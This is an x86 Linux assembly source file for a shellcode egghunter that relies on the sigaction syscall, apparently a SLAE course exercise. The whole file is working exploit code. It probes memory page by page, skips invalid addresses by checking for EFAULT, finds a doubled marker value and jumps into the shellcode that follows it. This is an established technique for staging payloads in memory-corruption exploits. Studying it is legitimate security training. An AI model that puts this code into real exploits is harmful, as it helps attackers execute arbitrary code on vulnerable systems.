; Shellcode Title: Egghunter 02 using sigaction
; Date: 20-02-2018
; Student Id: SLAE-1058
; Tested on: Ubuntu 12.04 LTS x86

global _start
section .text

_start:

align_page:

	; page alignment 4095
	or cx,0xfff

nextaddr:

	; syscall sigaction
	; #define __NR_sigaction           67
	inc ecx
	push byte +0x43
	pop eax
	int 0x80

	; if al is 0xf2 we get an EFAULT
	cmp al,0xf2
	
	; jump to align_page to try with the next page
	jz align_page
	
	; move our MARK in EAX
	mov eax, 0x50905090
	
	; move in EDI the address where we have to search our MARK
	mov edi, ecx
	
	; Compare EAX with EDI and set status flags
	; According to the doc, after the comparison, the EDI register is incremented by 4 for doubleword operations.
	scasd
	; if there's no match, we try the next address
	jnz nextaddr
	
	; We found the first MARK, we have to check the next 4 bytes
	scasd
	jnz nextaddr
	
	; we found our MARK twice, let's jump to our shellcode
	jmp edi
